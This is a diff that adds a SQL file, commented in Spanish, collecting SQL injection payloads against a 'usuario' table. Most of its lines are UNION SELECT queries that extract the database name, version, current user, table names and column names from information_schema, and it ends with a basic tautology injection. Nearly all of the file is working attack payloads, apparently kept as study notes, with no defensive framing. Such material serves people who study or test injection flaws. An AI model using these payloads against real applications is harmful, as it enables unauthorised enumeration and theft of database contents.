@@ -1,0 +1,32 @@
+-- inyeccion de código avanzada
+-- **************************************************
+-- base de datos
+-- ************************************************** 
+
+ -- averiguar el nombre de la base de datos
+ 
+ select * from usuario where usuario.id_user =-2 and 1=2 union select 1,2,database(),4,5,6,7,8,9,10,11,12,13,14;
+ 
+ -- obtener la version de la base de datos
+ 
+  select * from usuario where usuario.id_user =-2 and 1=2 union select 1,2,version(),4,5,6,7,8,9,10,11,12,13,14;
+  
+  -- obtener el usuario de la base de datos
+  
+  select * from usuario where usuario.id_user =-2 and 1=2 union select 1,2,user(),4,5,6,7,8,9,10,11,12,13,14;
+ 
+ -- avergiuar las tablas de la bases de datos
+ 
+ select * from usuario where usuario.id_user = null and 1=2 union select 1,2,(select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema = database()),4,5,6,7,8,9,10,11,12,13,14;
+
+ --  averiguar el nombre de las columnas de la tabla
+ 
+ select * from usuario where usuario.id_user = null and 1=2 union select 1,2,group_concat(column_name) COLLATE utf8_general_ci ,4,5,6,7,8,9,10,11,12,13,14 from information_schema.columns where table_name="usuario";
+ 
+ -- avergiuar el numero de columnas de una tabla
+ 
+  select * from usuario where usuario.id_user = null and 1=2 union select 1,2,(select count(*) from INFORMATION_SCHEMA.columns where table_name = 'usuario'),4,5,6,7,8,9,10,11,12,13,14;
+
+-- inyeccion básica
+ select * from usuario where usuario.id_user = ''or '1' = '1' limit 3;
+
